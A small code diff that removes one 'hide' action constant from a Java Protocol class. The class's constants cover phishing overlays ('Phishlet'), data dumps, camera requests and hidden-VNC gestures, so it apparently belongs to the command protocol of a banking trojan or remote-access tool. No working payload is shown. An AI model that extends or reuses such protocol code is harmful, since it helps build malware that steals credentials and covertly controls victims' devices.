@@ -222,7 +222,6 @@ public final class Protocol {
     // Overlay / Phishlet actions
     public static final String ACT_TRIGGER       = "trigger";
     public static final String ACT_CONFIGURE     = "configure";
-    public static final String ACT_HIDE          = "hide";
     public static final String ACT_DUMP          = "dump";
     public static final String ACT_CAMERA_REQ    = "camera_request";
     // v4.0 HVNC gesture extension keys
